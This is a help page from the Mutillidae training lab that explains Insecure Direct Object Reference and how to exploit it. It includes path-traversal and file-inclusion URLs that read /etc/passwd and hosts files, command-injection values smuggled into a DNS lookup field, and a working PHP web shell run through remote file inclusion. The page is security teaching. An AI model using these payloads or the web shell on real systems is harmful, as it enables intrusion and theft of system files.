			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			Insecure Direct Object Reference may result when the application
			retrieves or accesses a resource using the resource itself as
			the reference to lookup or identify the resource.
			<br/><br/>
			Examples may include passing the filename of a document to retrieve,
			relocating to a URL after allowing the browser to send the URL
			as a parameter value or including an include file based on the
			browser sending the include file path and name.
<br/><br/>
<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
<br/><br/>
<span class="report-header">Discovery Methodology</span>
<br/><br/>
For each parameter passed that identified a resource,
determine if the value is the resource itself or if the application
only accepts a token which is meaningless outside of that
context.
<br/><br/>
For example, if the site expects an include file name to be passed,
this could be a direct object reference. Alternatively if the site
expects an integer which the server later maps to the include file
to display, the site is not likely to be vulnerable to this issue.
<br/><br/>
<span class="report-header">Exploitation</span>
<br/><br/>
Based on the type of resource, submit other values to the server
in order to gain access or load content to which the user is not
authorized.
<br/><br/>
<span class="report-header">Example: Local File Inclusion</span>
<br/><br/>
Note the page parameter in NOWASP URLs. This parameter is the include
file to load within the main frame. Since this parameter loads any
file passed, attempt to pass a local file or remote file URI.
<br/><br/>
http://[PATH TO MUTILLIDAE]/index.php?page=/etc/passwd
<br/><br/>
<span class="report-header">Example: Accessing system files</span>
<br/><br/>
Step 1: Recon: Obtain list of files<br/><br/>
Possible Technique: Use command injection<br/>
Page: dns-lookup.php<br/>
Value (Windows): &amp;&amp; dir /w<br/>
Value (Linux): &amp;&amp; pwd &amp;&amp; ls -l<br/>
<br/>
Possible Technique: Use robots.txt<br/>
Possible Technique: Use directory browsing<br/>
Possible Technique: Use directory brute-forcing<br/>
Possible Technique: Guess<br/>
<br/><br/>
Step 2: Gaining Access: Retrive system files
<br/><br/>
Page: source-viewer.php<br/>
Technique: Use an interception proxy like Burp to change the value of the phpfile parameter. Use parent directory (..) to bypass jails.<br/>
Tool: Tamper Data, Paros, WebScarab, Burp<br/>
Field: phpfile<br/>
Value: &lt;system file path&gt;, ../../../boot.ini, ..\..\..\WINDOW\System32\drivers\etc\hosts, ../../../etc/passwd
<br/><br/>
<span class="report-header">Example: Remote File Inclusion - Web Shell</span>
<br/><br/>
Save this web shell in a file.
<br/><br/>
&lt;?php
	echo &quot;&lt;pre&gt;&quot;;
	echo &quot;shell_exec &quot;.$_REQUEST[&quot;pCommand&quot;].&quot;\n\n&quot;;
	echo shell_exec($_REQUEST[&quot;pCommand&quot;]);
	echo &quot;&lt;/pre&gt;&quot;;
?&gt;
<br/><br/>
The web shell can be served using python's built-in web server. Python SimpleHTTPServer serves any content in the current directory on the port specified
<br/><br/>
python -m SimpleHTTPServer 8888
<br/><br/>
Browse to the web shell passing in the command as parameter pCommand
<br/><br/>
http://[PATH TO MUTILLIDAE]/index.php?page=http://127.0.0.1:8888/simple-web-shell.php&pCommand=cat+/etc/passwd
<br/><br/>
<span id="videos" class="report-header">Videos</span>
<br/><br/>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisInsecureDirectObjectReferenceIDOR);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisanOpenRedirect);?>
<br/><br/>